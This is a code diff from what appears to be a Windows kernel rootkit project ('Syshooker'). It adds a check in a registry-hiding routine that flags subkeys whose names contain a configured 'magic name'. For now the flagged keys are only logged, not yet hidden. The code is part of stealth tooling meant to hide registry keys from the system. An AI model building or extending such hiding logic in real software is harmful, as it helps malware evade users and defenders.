@@ -1,6 +1,7 @@
 #include "utils.h"
 #include "stdafx.h"
 #include "../Syshooker-Client/SyshookerCommon.h"
+#include "Settings.h"
 
 void PrintRegistryKeyHandleInformation(HANDLE KeyHandle, const wchar_t* CallingFunctionName) {
 	// TODO - dynamic allocation
@@ -88,10 +89,13 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubk
                 SubKeyNameBuffer[i] = subKeyInfo->Name[i];
             }
 
-            kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", index, SubKeyNameBuffer);
-
-
-            // if (wcsstr(SubKeyNameBuffer, Settings.RegistryKeyMagicName)) {}
+            // TODO? - better function that evaluates whether a subkey should be hidden?
+            if (wcsstr(SubKeyNameBuffer, Settings.RegistryKeyMagicName)) {
+                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", index, SubKeyNameBuffer);
+            }
+            else {
+                kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", index, SubKeyNameBuffer);
+            }
         }
         else {
             kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", index);
